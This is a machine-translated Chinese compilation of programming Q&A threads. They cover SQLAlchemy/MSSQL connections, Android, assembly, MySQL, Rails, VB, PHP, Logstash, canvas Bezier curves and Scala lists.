> 赞同：27
> 
> 时间：2016-04-20T14:42:29.863

我有关于在不使用 DSN 和使用 Windows 身份验证的情况下连接到 MSSQL Server 的更新信息。在我的示例中，我有下一个选项：我的本地服务器名称是“(localdb)\ProjectsV12”。我从数据库属性中看到的本地服务器名称（我使用的是 Windows 10 / Visual Studio 2015）。我的数据库名称是“MainTest1”

```
engine = create_engine('mssql+pyodbc://(localdb)\ProjectsV12/MainTest1?driver=SQL+Server+Native+Client+11.0', echo=True) 
```

连接时需要指定驱动程序。您可以在以下位置找到您的客户端版本：

> 控制面板>系统和安全>管理工具。>ODBC 数据源>系统 DSN 选项卡>添加

从列表中查看 SQL Native 客户端版本。

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2018-03-27T18:28:09.730

只想在此处添加一些最新信息：如果您使用 DSN 连接进行连接：

```
engine = create_engine("mssql+pyodbc://USERNAME:PASSWORD@SOME_DSN") 
```

如果您使用主机名连接进行连接：

```
engine = create_engine("mssql+pyodbc://USERNAME:PASSWORD@HOST_IP:PORT/DATABASENAME?driver=SQL+Server+Native+Client+11.0") 
```

更多详情请参考[“官方文档”](http://docs.sqlalchemy.org/en/latest/dialects/mssql.html "官方文件")

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2021-04-20T19:10:47.790

```
import pyodbc 
import sqlalchemy as sa
engine = sa.create_engine('mssql+pyodbc://ServerName/DatabaseName?driver=SQL+Server+Native+Client+11.0',echo = True) 
```

这适用于 Windows 身份验证。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2020-04-09T04:10:52.183

我做了不同的事情，像一个魅力一样工作。

### 首先导入库：

```
import pandas as pd
from sqlalchemy import create_engine
import pyodbc 
```

### 创建一个函数来创建引擎

```
def mssql_engine(user = os.getenv('user'), password = os.getenv('password')
                 ,host = os.getenv('SERVER_ADDRESS'),db = os.getenv('DATABASE')):
    engine = create_engine(f'mssql+pyodbc://{user}:{password}@{host}/{db}?driver=SQL+Server')
    return engine 
```

### 使用您的查询创建一个变量

```
query = 'SELECT * FROM [Orders]' 
```

### 执行 Pandas 命令从 MSSQL 表创建数据框

```
df = pd.read_sql(query, mssql_engine()) 
```

# java - 我的 Android 应用程序找不到在 XML 文件中声明的按钮

> ID：15750714
> 
> 赞同：0
> 
> 时间：2013-04-01T19:54:15.873
> 
> 标签：java, android, android-resources

在读取 XML 对象之前，我的应用程序运行良好，但现在我已经添加到两个按钮和一个 textview 中，但在查找它们时遇到了问题。

![](https://i.stack.imgur.com/mLNGV.png)

所以我在那里添加了三个对象以更好地控制我的应用程序并且活动类找不到它们

```
public class TVListingTestActivity extends Activity implements OnClickListener 
{
private static final String TAG = "myApp";

private EditText infoView;
private String result;
private String full;

public int count;

final Context context =this;

private LinkedList<Widget> aList;
private LinkedList<String> stringList;
private LinkedList<Button> buttons;

private Button forwardDay;
private Button backDay;
private TextView display;

private int dayParse= 0;
private String tvListingURL;

@Override
public void onCreate(Bundle savedInstanceState) 
{
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);
    stringList = new LinkedList<String>();

    infoView= (EditText) findViewById(R.id.infoView);
    tvListingURL = "http://bleb.org/tv/data/rss.php?ch=bbc1_scotland&day="+dayParse;

    forwardDay=(Button)findViewById(R.id.forwardbutton);
    backDay=(Button)findViewById(R.id.backbutton);
    display=(TextView)findViewById(R.id.displayview); 
```

资源似乎出现在 R 文件中，所以我无法理解问题所在。有没有人遇到过这样的事情？

```
package org.me.myandroidstuff;

public final class R {
public static final class array {
    public static final int shows=0x7f040000;
}
public static final class attr {
}
public static final class drawable {
    public static final int icon=0x7f020000;
}
public static final class id {
    public static final int back=0x7f060002;
    public static final int cspinner=0x7f060007;
    public static final int dialog_info=0x7f060000;
    public static final int infoView=0x7f060003;
    public static final int main=0x7f060004;
    public static final int main_page=0x7f060006;
    public static final int mainll=0x7f060005;
    public static final int reminder=0x7f060001;
}
public static final class layout {
    public static final int dialog_info=0x7f030000;
    public static final int main=0x7f030001;
    public static final int main_page=0x7f030002;
}
public static final class string {
    public static final int app_name=0x7f050001;
    public static final int hello=0x7f050000;
}
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T20:19:09.137

`android.R`从您在 java 文件中的导入中删除。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T20:11:26.903

检查 R.java 是否包含布局类中的“主”类。R.java 位于 gen 文件夹中。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-01T20:46:44.947

两个按钮的 id 和 R.java 中的 TextView 不是你的 TVListingTestActivity 类中的。确保它们在 XML 布局文件和 R.java 中相同，清理您的项目，然后正确初始化：

例如，backDay 按钮初始化应该从：

```
backDay = (Button)findViewById(R.id.backbutton); 
```

到：

```
backDay = (Button)findViewById(R.id.back); 
```

# assembly - “'shr' 的后缀或操作数无效”

> ID：15750716
> 
> 赞同：0
> 
> 时间：2013-04-01T19:54:19.623
> 
> 标签：assembly, bit-shift, att

我试图摆脱寄存器中的低位（在执行 a 之前`popcnt`），但似乎无法正确获取指令的语法。我想`%rdx`从`%r8d`. 搜索告诉我 count 参数应该是一个 8 位寄存器，所以我目前在：

```
shrl %dl, %r8d 
```

GAS 对此抱怨，我真的不知道如果这些论点是错误的，那么这些论点究竟应该是什么。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T20:15:30.770

根据英特尔 PRM，您应该使用`%cl`而不是`%dl`

# php - MYSQL排序和限制使用某一行并选择上一行和下一行

> ID：15750720
> 
> 赞同：3
> 
> 时间：2013-04-01T19:54:37.697
> 
> 标签：php, mysql, sql, database, sorting

我有一个名为 users 的简单表，其中包含以下数据：

```
id | hops
 1 | 3
 2 | 1
 3 | 5
 4 | 2
 5 | 4
 6 | 5 
```

我想选择我指定的任何给定 id 的跃点数，并根据从最高到最低排序的跃点数选择下一个和上一个 id。

为了解释更多，我使用以下查询：

```
SELECT * FROM test WHERE id = 1 
OR (id > 1 AND hops >= (SELECT hops FROM test WHERE id= 1) ) 
OR (id < 1 AND hops <= (SELECT hops FROM test WHERE id= 1) ) 
LIMIT 3 
```

因此，在上面的查询中，我尝试获取`id=1`具有相同或更高跳数的下一个 id，以及具有相同或更少跳数的前一个 id。

这是我得到的结果：

```
id | hops
1  | 3
3  | 5
5  | 4 
```

正如你所看到的，它选择了 id=1 和两个更高的 id，尽管我只想要一个更高的 id 和一个更低的 id。因此，在这种情况下，结果应该是这样的：

```
id | hops
1  | 3
3  | 5 
```

由于没有低于 1 的 id，所以没有低于 1 的 id 符合标准，只选择 1 个更高的 id。错误的结果是因为使用了 LIMIT 3 但我不能对每个条件都使用 LIMIT。所以根本不知道如何处理这个问题。

还有一个问题，使用子查询会 `"SELECT hops FROM test WHERE id= 1"` 大规模降低服务器速度吗？我听说使用子查询并不可取，但除了使用单独的查询外，没有其他方法可以得到这个数字。

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-01T19:59:53.853

给你，根据你的喜好改变ID的顺序......你没有说你想要最接近的跳数还是最接近的ID，只是更大或更小一个

```
SELECT * FROM test 
WHERE id IN (1,(
    SELECT id FROM test WHERE id > 1 AND hops >= (
        SELECT hops FROM test WHERE id = 1
        ) ORDER BY id LIMIT 1
    ), (
    SELECT id FROM test WHERE id < 1 AND hops <= (
        SELECT hops FROM test WHERE id = 1
        ) ORDER BY id DESC LIMIT 1
)) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T20:19:58.390

如果我正确理解您的问题，我相信以下内容会起作用。

```
-- Previous Rec
SELECT  t2.*
FROM    test as t1
        JOIN test as t2 ON t2.hop <= t1.id
WHERE   t1.id = 1
ORDER BY t2.id DESC
LIMIT 1

UNION ALL

-- Current Rec
SELECT  *
FROM    test as t
WHERE   id = 1

UNION ALL

-- Following Rec
SELECT  t2.*
FROM    test as t1
        JOIN test as t2 ON t2.id >= t1.hop
WHERE   t1.id = 1
ORDER BY t2.id ASC
LIMIT 1 
```

# ruby-on-rails - 在 Rails 中对数字字符串进行排序

> ID：15750722
> 
> 赞同：5
> 
> 时间：2013-04-01T19:54:50.383
> 
> 标签：ruby-on-rails, ruby, postgresql

首先，一个警告：我对 Ruby 和 Rails 还很陌生。

我的模型中有一个字符串字段，它为我的客户引用了一个现有的离线命名方案，它是由小数分隔的整数。所以“1.1”和“5.10.1.5”等。

我想使用 Rails 的默认范围排序，但只是按此字段进行正常排序会导致如下问题：

1 1.10 1.2 1.3

显然，我希望最后对 1.10 进行排序。谁能指出我正确的方向？

我正在使用 Rails 3.2.10 和 Postgres 9.1.4。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-01T20:17:43.077

在 Ruby 中有多种对此类事物进行排序的方法，但这里有一种可能性*（来自 Matthias Reitinger 在[ruby](http://www.ruby-forum.com/topic/182743) ​​-forum 上的帖子）*：

```
arr = arr.sort_by do |x|
  x.split(".").map {|i| i.to_i}
end 
```

*`arr`你的数组在哪里。*

这最终会像这样对这些数字进行排序*（至少从 Ruby 1.8.7 开始）*：

```
1.1
1.2
1.9
1.10 
```

更多信息可以在[这里](http://www.ruby-forum.com/topic/182743)找到。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-01T20:23:39.790

您真的真的不想在 ruby​​ 中进行这种排序，因为您将失去链接范围、对结果进行分页、`limit`正确使用等的能力。

这是 Postgres 特有的，但应该完全符合您的要求。

```
default_scope order("string_to_array(num, '.', '')::int[]") 
```

[SQL小提琴](http://sqlfiddle.com/#!1/cd97d/2)

[Postgres 文档](http://www.postgresql.org/docs/9.1/static/functions-array.html)

# vb.net - 基于日期参数和日期字段或另一个日期字段（Visual Studio 2008、Report Builder 3.0、SharePoint 列表）返回记录的 VB 函数

> ID：15750728
> 
> 赞同：0
> 
> 时间：2013-04-01T19:55:08.887
> 
> 标签：vb.net, visual-studio-2008, reporting-services, ssrs-2008, sharepoint-list

另一个问题源于这个棘手的环境和我的经验不足。似乎 VB 函数是我可以满足其中一些报告要求的唯一方法。

我有一种情况，用户希望在报告中查看数据，如下所示：

一般要求是：报表初始化时，不显示任何数据——用户必须输入一个参数。这是完整的。该参数是一个日期参数——如果日期为空，则返回列表中的所有项目。如果为参数输入了日期，则必须返回等于或大于数据参数的 typeA 或 typeB 的所有项。

更具体地说，这就是我要完成的任务：返回 typeA_date 不为空且大于或等于参数中输入的日期的所有项目，**或者**返回 typeB_date 不为空且大于或等于参数中输入的日期。

这是我的代码，但它返回错误：

```
Function dtComprRtrn(ByVal awardField As String, ByVal suspendField As String, ByVal chkDtField As String) As Boolean
    If chkDtField Is Nothing Then
        Return True
    End If
    Dim awardDate As Date
    Dim suspendDate As Date
    If (IsDate(awardDate)) Then
        chkDtField = Convert.ToDateTime(awardDate)
    ElseIf (IsDate(suspendDate)) Then
        chkDtField = Convert.ToDateTime(suspendDate)
    Else
        Return False
    End If
    If awardDate >= chkDtField Then
        Return True
    Else
        If suspendDate >= chkDtField Then
            Return True
        Else
            Return False
        End If
    End If 
```

错误是这样的：

> “编译表达式时发生意外错误。本机编译器返回值：'[BC30289] 语句不能出现在方法主体中。假定方法结束”

我在这方面没有太多经验，也没有将功能集成到报表生成器中，我永远感谢可能提供的任何帮助。非常感谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T18:14:44.747

这是已实现且似乎正在运行的最终代码解决方案：

```
Function dtComprRtrn(ByVal awardField As String, ByVal suspendField As String, ByVal chkDtField As String) As Boolean
    If chkDtField Is Nothing Then
        Return True
    End If
    Dim compareDate As Date = DateTime.MinValue
    Dim chkDtDate As Date = DateTime.MinValue
    ' Check to see if input string chkDtField is a date
    If (IsDate(chkDtField)) Then
        chkDtDate = Convert.ToDateTime(chkDtField)
    End If
    ' Check to see if either awardField or suspendField is a date
    ' if not then return false
    If (IsDate(awardField)) Then
        compareDate = Convert.ToDateTime(awardField)
    ElseIf (IsDate(suspendField)) Then
        compareDate = Convert.ToDateTime(suspendField)
    Else
        Return False
    End If
    ' Now we know we have a date in compareDate
    ' and we know that chkDtDate is at least DateTime.MinValue
    ' so if chkFtField was blank then this comparison will always
    ' work if we have a valid date for awardField or suspendField
    If compareDate >= chkDtDate Then
        Return True
    Else
        Return False
    End If
End Function 
```

# android - Android比较来自HttpResponse的字符串

> ID：15750730
> 
> 赞同：0
> 
> 时间：2013-04-01T19:55:09.267
> 
> 标签：android, string, comparison, httpresponse

我有一个奇怪的问题，我有两个应用程序（Web 和 Android），第一个总是响应`text/plain`以下 sintax

如果业务逻辑成功，则响应为

```
OK
2013-04-01 14:31:26 
```

如果失败

```
ERROR
TypeError:MessageError 
```

现在网络应用程序运行正常问题是当我要在我的 android 设备中读取响应时

```
final HttpEntity entity = response.getEntity();
BufferedReader buffer;
String line = null;

try {
    buffer = new BufferedReader(new InputStreamReader(entity.getContent()), 2048);

    // Read first line
    line = buffer.readLine();
    Log.i(TAG, "Result : '" + line + "'");
    if(line == "OK") {
        // To something with the following lines
    } else {
        while(null != (line = buffer.readLine()) {
            Log.i(TAG, "ERROR: " + line);
        }
    }
} catch (IllegalStateException e1) {
} catch (IOException e1) {
} 
```

如果行打印，问题`line`永远不会等于事件`OK``Log.i(TAG, "Result : '" + line + "'")``Result : 'OK'`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T19:57:35.653

在java中你必须使用 .equals() 来比较字符串......

所以你的代码应该是这样的：

```
if(line.equals("OK")) { 
```

# objective-c - Ruby 1.8.7 中的 Ruby 字符串编码

> ID：15750732
> 
> 赞同：3
> 
> 时间：2013-04-01T19:55:13.390
> 
> 标签：objective-c, c, ruby, character-encoding

我正在使用 Ruby C API（来自 Objective C）创建一个 Ruby 字符串，它恰好包含芬兰语字符。

一旦在 Ruby 中，我调用一个 gem，它会进行一些操作，截断字符串，但编码的字符会被不正确地截断 - 非常像这个问题：

[如何获取 Unicode 字符串的 Ruby 子字符串？](https://stackoverflow.com/questions/3146007/how-to-get-a-ruby-substring-of-a-unicode-string)

一个示例字符串是 H pääsee syvemmälle A elämään - 变音符号会变成 \30333 之类的东西，但在截断后会变成 \303，这是一个问题。

我不想破解 gem 来解决这个问题，因为我已经使用直接在 Ruby 中打开的相同字符串进行了测试，并且效果很好。

所以我知道我向 Ruby 传递了一些错误的东西。

以下是我如何将 NSString 转换为 VALUE 以在 Ruby 中使用。

```
- (VALUE) toRubyValue {
    size_t data_length = [self lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
    size_t buffer_length = data_length + 1;
    char buf[buffer_length];
    [self getCString:buf maxLength:buffer_length encoding:NSUTF8StringEncoding];
    return rb_str_new(buf, data_length);
} 
```

我在 Ruby 1.8.7

解决这个问题的最佳方法是什么 - 我很高兴在 Ruby 或 C（或 Objective C）中做到这一点，但我宁愿不使用任何具有本机 C 扩展的 Ruby Gem

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-13T06:39:24.213

我不认为您将某些内容错误地传递给 Ruby。您正在创建一个 UTF-8 编码的 Ruby 1.8 字符串。Ruby 1.8 并不关心编码，而是将字符串视为字节数组。这意味着*任何*不正确的 Ruby 代码都可能产生您所说的结果。“破解”宝石确实是您唯一的选择。

升级到 1.9 甚至 2.0 是您最好的出路。

# php - PHP：标题无法正常工作

> ID：15750735
> 
> 赞同：1
> 
> 时间：2013-04-01T19:55:33.123
> 
> 标签：php

我有一个安全网页，它只允许访问 PHP 中的某个 IP 地址，但我也添加了一个引用条件，以防我必须访问我的 Intranet 之外进行编辑。由于某种原因，它不起作用。

这是我编辑的重定向页面名称 in2.php（工作）**：**

```
<?php
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<html>
<head>
<title>Redirecting...</title>
<meta http-equiv="REFRESH" content="0;url=http://www.mysite.com/in.php"></HEAD>
<BODY>
</BODY>
</HTML> 
```

这是我的 in.php 代码：

```
 <?php
    $visitor = $_SERVER['REMOTE_ADDR'];
    $referer = $_SERVER["HTTP_REFERER"];
    if (preg_match("/152.12.32.65/", $visitor) || $referer == "http://www.mysite.com/in2.php") {
    << MY SITE >>
    }
    else {
    echo "not accessible";
    }
    ?>
} 
```

当我从手机访问 in2.php 时，即使 IP 地址不同，它是否仍然允许我查看该站点？我只得到“不可访问”的文本。是因为我在 in2.php 中使用了“header()”函数吗？如果我将其更改为 HTML/Jquery 重定向，它会起作用吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T20:00:56.643

标头函数设置一个位置标头。您可能需要自己添加引用标头，因为您没有告诉浏览器它只是命中了重定向。更好的选择可能是发送正确的 301 或 307。我现在正在使用手机，因此链接和参考因懒惰而丢失；）。

# jquery - 如何让相同的 javascript 代码响应多个 ajax 调用？

> ID：15750736
> 
> 赞同：1
> 
> 时间：2013-04-01T19:55:40.650
> 
> 标签：jquery, ruby-on-rails, ruby, ajax

我想让这两个动作用一个javascript模板publication.js.erb响应，而不是为每个动作使用file.js.erb。

```
##AJAX CALLBACKS##

def publish
    @myth = Myth.find(params[:id])
    if @myth.update_attributes(:status=>2)
      #change status to publish
      @msg  = "Your Myth has been Published"
      @type = "alert-success"
    else
      @msg  = "Your Myth has not been Published"
      @type = "error-success"
    end

    respond_to do |format|
      format.html { redirect_to root_path }
      format.js
    end
  end

  def unpublish
    @myth = Myth.find(params[:id])
    if @myth.update_attributes(:status=>0)
      #change status to publish
      @msg  = "Your Myth has been Unpublished"
      @type = "alert-success"
    else
      @msg  = "Your Myth has not been Unpublished"
      @type = "error-success"
    end

    respond_to do |format|
      format.html { redirect_to root_path }
      format.js
    end
  end 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-01T20:11:39.080

在您的每个`respond_to`块中，只需执行以下操作：

```
format.js { render 'publication' } 
```

这将使两个动作呈现相同的模板文件。

# cordova - 关闭多页 Phonegap 应用

> ID：15750737
> 
> 赞同：0
> 
> 时间：2013-04-01T19:55:44.627
> 
> 标签：cordova

我正在开发一个多页 Phonegap 应用程序，我需要有关 navigator.app.exitApp() 的帮助。

我为一页应用程序找到了许多解决方案，但对于多页应用程序却没有。如果我尝试在每个页面上添加指向 cordova.js 的链接，应用程序将失败。如果我不添加它，应用程序将无法识别 navigator.app

我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T08:39:16.553

我使用多页架构，使用以下命令退出应用程序（在任何页面）都没有问题：

```
e.preventDefault();
navigator.app.exitApp(); 
```

# ruby-on-rails - 在检查机器人的函数中使用中断时，Ruby 函数返回 true 而不是 false

> ID：15750741
> 
> 赞同：1
> 
> 时间：2013-04-01T19:55:53.610
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3, bots, break

我有一个应该返回布尔值的函数。在函数内部，我正在检查用户是否被 cookie。如果用户没有被 cookie 比我想运行检查，看看他们是否是一个机器人。我有一个名为@bots 的数组，其中包含“googlebot”和“msnbot”等字符串。@bots 数组是使用 before_filter 创建的并且可用。

我想要做的是允许机器人访问，即使它们没有被 cookie。由于某种原因，这不起作用，因为我也需要它。我对 RoR 相当陌生，我很感激可以提供的任何和所有帮助。提前致谢。

我正在使用 chrome 进行测试，所以我在 bots 数组中添加了“Chrome”并删除了我的 cookie，但该函数仍然返回 false。我确信我忽略了一些东西。

```
def verified?
  if cookies[:verified].nil? 
    @bots.each do |bot| 
      if request.env['HTTP_USER_AGENT'].include? bot
        true
        break
      else
        false
      end
    end
  else
    true
  end 
end 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-01T20:02:30.380

这个功能可以大大简化。尝试这样的事情：

```
def verified?
  cookies[:verified].present? or @bots.any? do |bot|
    request.env['HTTP_USER_AGENT'].include? bot
  end
end 
```

[这](http://ruby-doc.org/core-2.0/Enumerable.html#method-i-any-3F)是该`any?`函数的文档，它正是您在此处寻找的。最好使用这样的内置函数，这样你的代码比你自己重新实现这些函数时更清晰，更不容易出错。

# elasticsearch - Logstash/ElasticSearch：字段数据类型猜测错误

> ID：15750749
> 
> 赞同：6
> 
> 时间：2013-04-01T19:56:21.970
> 
> 标签：elasticsearch, logstash

我尝试导入 Logstash 的日志文件包含一个有时看起来像日期/时间但有时却不是的字段。不幸的是，第一次出现看起来像日期/时间，有人（logstash 或 elasticsearch）决定将该字段定义为日期/时间。在尝试导入稍后的日志记录时，Elasticsearch 出现异常：

```
Failed to execute [index ...]  
org.elasticsearch.index.mapper.MapperParsingException: Failed to parse [@fields.field99]  
at org.elasticsearch.index.mapper.core.AbstractFieldMapper.parse(AbstractFieldMapper.java:320)  
at org.elasticsearch.index.mapper.object.ObjectMapper.serializeValue(ObjectMapper.java:587)  
...  
Caused by: java.lang.IllegalArgumentException: Invalid format: "empty"  
at org.elasticsearch.common.joda.time.format.DateTimeFormatter.parseMillis(DateTimeFormatter.java:747)  
... 
```

**问题**：如何告诉 logstash/elasticsearch 不要将此字段定义为日期/时间？我希望将日志中的所有字段（一个明确的时间戳字段除外）都定义为文本。

**问题**：在看到弹性搜索引发异常的日志文件后，logstash 似乎放弃了尝试从日志文件导入记录。如何告诉 logstash 忽略此异常并继续尝试从日志文件中导入其他记录？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-02T12:59:55.843

我自己找到了第一个问题的答案。

在通过 Logstash 添加数据之前，我必须为 Elasticsearch 设置默认值，以将字段视为“字符串”而不是“日期”。

我通过创建这样的 defaults.js 文件来做到这一点：

```
{  
    "template": "logstash-*",  
    "mappings": {  
        `"_default_"`: {  
            "dynamic_templates": [{  
                "fields_template": {  
                    "mapping": { "type": "string" },  
                    "path_match": "@fields.*"  
                }  
            }]  
        }  
    }  
} 
```

并告诉 Elasticsearch 在通过 Logstash 添加任何数据之前使用它：

curl -XPUT `'http://localhost:9200/_template/template_logstash/'`-d @defaults_for_elasticsearch.js

希望这对其他人有帮助。

# ios - ViewController 关闭时如何在 Monotouch iOS 应用程序中删除观察者

> ID：15750753
> 
> 赞同：1
> 
> 时间：2013-04-01T19:56:40.333
> 
> 标签：ios, xamarin.ios, nsnotificationcenter, observers

我的 MonoTouch 应用程序中有一些视图控制器正在使用 NSNotificationCenter 来侦听可能在我的应用程序中触发的某些事件。只要控制器仍在堆栈中，它们就应该在监听和更新（即使它们不是当前可见的视图。）

当视图不再在当前堆栈中时（通过使用后退按钮、自行关闭控制器或在调用 PopToRootController 之后），我该如何移除侦听器？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T23:51:54.843

你的视图控制器上的东西应该可以工作：

```
public override void ViewDidDisappear (bool animated)
{
    base.ViewDidDisappear (animated);
    NSNotificationCenter.DefaultCenter.RemoveObserver(this);
} 
```

# javascript - 创建只有起点和终点的贝塞尔曲线

> ID：15750755
> 
> 赞同：0
> 
> 时间：2013-04-01T19:56:45.677
> 
> 标签：javascript, canvas, bezier

我正在尝试创建一个 html 画布，用户可以在其中定义起点和终点，在起点和终点之间我想画一条波浪线，我通过绘制 bezierCurveTo 来做到这一点。

一个样品：

![采样波](https://i.stack.imgur.com/YRqLv.png)

我用来绘制它的代码如下：

```
var wave = new Kinetic.Shape({
        drawFunc: function (canvas) {
            var ctx = canvas.getContext();
            ctx.beginPath();
            ctx.moveTo(50, 50);
            var waveCount = 0;
            var controlPoint1X = 55;
            var controlPoint2X = 60;
            var endPointX = 65;
            while(waveCount < 10) {
                ctx.bezierCurveTo(controlPoint1X, 35, controlPoint2X, 65, endPointX, 50);
                controlPoint1X += 20;
                controlPoint2X += 20;
                endPointX += 20;
                waveCount++;
            }
            ctx.stroke(_this);
        },
        stroke: '#000000',
        strokeWidth: 2
    }); 
```

只要只有 x 或 y 坐标发生变化，我就可以完成这项工作。现在我希望能够创建一个如上所示的波浪线，但具有不同的 x,y 坐标。例如起点 x: 50 y: 50 和终点 x: 100 y: 100。我知道我必须计算控制点，但我不知道我必须使用什么公式。有人可以帮我吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T19:56:55.937

让我们在一条直线上模拟一个圆和正弦波。对于一个半圆，每个“周期”由两段组成，其中第一段是：

```
cDist = 4/3 * amplitude 
```

（我们从[http://pomax.github.com/bezierinfo/#circles_cubic](http://pomax.github.com/bezierinfo/#circles_cubic)知道这一点）

```
S = (x1, 0),
C1 = (x1, cDist)
C2 = (x2, cDist)
E = (x2, 0) 
```

第二部分是：

```
S = (x2, 0),
C1 = (x2, -cDist)
C2 = (x3, -cDist)
E = (x3, 0) 
```

对于正弦波，控制点几乎相同；y 坐标保持在相同的高度，但我们需要移动 x 坐标，以便形状在起点和终点具有校正的角度（对于圆形，它们是垂直的，对于正弦波，它们是对角线）：

```
S = (x1, 0),
C1 = (x1 + cDist/2, cDist)
C2 = (x2 - cDist/2, cDist)
E = (x2, 0) 
```

第二部分是：

```
S = (x2, 0),
C1 = (x2+cDist, -cDist)
C2 = (x3-cDist, -cDist)
E = (x3, 0) 
```

我在以下位置放置了一个演示器：http: [//jsfiddle.net/qcUyC/6](http://jsfiddle.net/qcUyC/6)

如果您希望这些线处于固定角度，我的建议是：旋转您的上下文。实际上不要改变你的坐标。只需使用 context.rotate(...) 就可以了。见[http://jsfiddle.net/qcUyC/7](http://jsfiddle.net/qcUyC/7)

但是，如果您*绝对*需要不只是在正确的位置绘制的坐标，而是具有代表真实角度线的坐标，那么从您的角度开始：

```
angle = some value you picked, in radians (somewhere between 0 and 2*pi) 
```

有了这个角度，我们可以放置我们的观点：

```
dx = some fixed value we pick
dy = some fixed value we pick

ox = the x-offset w.r.t. 0 for the first coordinate in our line
oy = the y-offset w.r.t. 0 for the first coordinate in our line

x1 = ox
y1 = oy

x2 = (dx * cos(angle) - dy * sin(angle)) + ox
y2 = (dx * sin(angle) + dy * cos(angle)) + oy

x3 = (2*dx * cos(angle) - 2*dy * sin(angle)) + ox
y3 = (2*dx * sin(angle) + 2*dy * cos(angle)) + oy

...

xn = ((n-1)*dx * cos(angle) - (n-1)*dy * sin(angle)) + ox
yn = ((n-1)*dx * sin(angle) + (n-1)*dy * cos(angle)) + oy 
```

然后，您必须将控制点视为相对于线段中起点的向量，因此 C1' = C1-S 和 C2' = C2-S，然后使用相同的变换旋转它们。然后，您将这些向量添加回您的起点，您现在拥有正确旋转的控制点。

就是说，不要那样做。让 canvas2d API 为您进行旋转并绘制直线。它使生活变得如此轻松。

# java - com.itextpdf.text.pdf.PdfPKCS7 库在 java IText 中不存在

> ID：15750756
> 
> 赞同：0
> 
> 时间：2013-04-01T19:56:47.823
> 
> 标签：java, itext

无论我将什么版本的 IText 添加到我的项目中

```
com.itextpdf.text.pdf.PdfPKCS7 
```

那里比较紧张。

[虽然在 javadoc http://api.itextpdf.com/itext/com/itextpdf/text/pdf/PdfPKCS7.html](http://api.itextpdf.com/itext/com/itextpdf/text/pdf/PdfPKCS7.html)中有参考

有人可以告诉我为什么我无法添加 com.itextpdf.text.pdf.PdfPKCS7 吗？

PS：5.3.0到5.4.0的所有版本都试过了

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T20:06:45.680

PdfPKCS7 具有以下包签名

```
package com.itextpdf.text.pdf.security; 
```

并且还有一个替代的 javadoc 页面[http://api.itextpdf.com/itext/com/itextpdf/text/pdf/security/PdfPKCS7.html](http://api.itextpdf.com/itext/com/itextpdf/text/pdf/security/PdfPKCS7.html)

它可能是混合了 javadocs 的快照的自动构建。

# scala - 将对象添加到scala中的列表

> ID：15750759
> 
> 赞同：6
> 
> 时间：2013-04-01T19:56:52.650
> 
> 标签：scala

我正在尝试向列表中添加和反对，而不仅仅是一个数字，所以当您回复一个示例时，您是否可以使用像我的二手车示例或水果之类的对象，或者我一直在寻找的所有地方以及我看到的所有示例只是将数字添加到列表中。
我试图将一些java代码转换为scala，我无法转换的java代码是

```
ArrayList usedCarList = new ArrayList();
UsedCars usedCar = new UsedCars();
usedCarList.add(usedCar); 
```

现在我看了几个例子，但是一旦我开始尝试使用一个对象，它们似乎就不起作用了，即

```
var b = List[Int](); 
b ::= 1; 
b ::= 2; 
b ::= 3; 
```

我已经尝试了一些事情 1 下面列出了。

```
var usedCarList = List();
def addCar (usedCarList: List[UsedCars]){
var usedCar = new UsedCars();
series of set operations on the usedCar
usedCar :: usedCarList;
println(usedCarList.length);
} 
```

当我检查列表的大小时，它总是空的

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-01T20:12:03.567

有可变的（例如`scala.collection.mutable.MutableList`）和不可变的列表（`scala.collection.immutable.List`）。您使用的是不可变列表，因此仅调用`::`一个元素实际上会返回一个带有添加元素的新实例，但不会更改基础值。您必须将 a`var`与不可变列表一起使用，或者使用这样的可变列表：

```
scala> import scala.collection._
import scala.collection._

scala> val list = mutable.MutableList[UsedCars]()
list: scala.collection.mutable.MutableList[UsedCars] = MutableList()

scala> list += new UsedCars()
res0: list.type = MutableList(UsedCars@4bfa79c8)

scala> list.size
res1: Int = 1 
```

有关使用不可变列表重新分配引用的信息，请参见 su- 的答案。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-04-02T02:58:56.560

`List`Scala和 Java之间有一个根本区别`ArrayList`：Scala`List`是不可变的。

不仅仅是只读的——Java 中的只读集合仍然可能被创建它的人更改。在 Scala 中， a`List`不能被*任何人*更改。

现在，让我们将其与您展示的“有效”示例相协调：`b ::= 1`。该示例等效于`b = 1 :: b`，因此它不会更改列表。相反，它正在创建一个*新*列表，并将其分配给`b`. 这听起来可能效率低下，但实际上速度非常快，因为它`List`是一个持久数据结构（查找更多信息）。

因此，对您的问题最明显的答案是使用不同类型的数据结构。Scala 最接近的等价物`ArrayList`是`ArrayBuffer`.

但是，还有另一种可能。与其更改列表并且不返回任何内容，不如返回一个新列表。这很可能需要对代码结构进行其他更改，并且由于没有关于它的详细信息，我不会推测它们可能是什么。

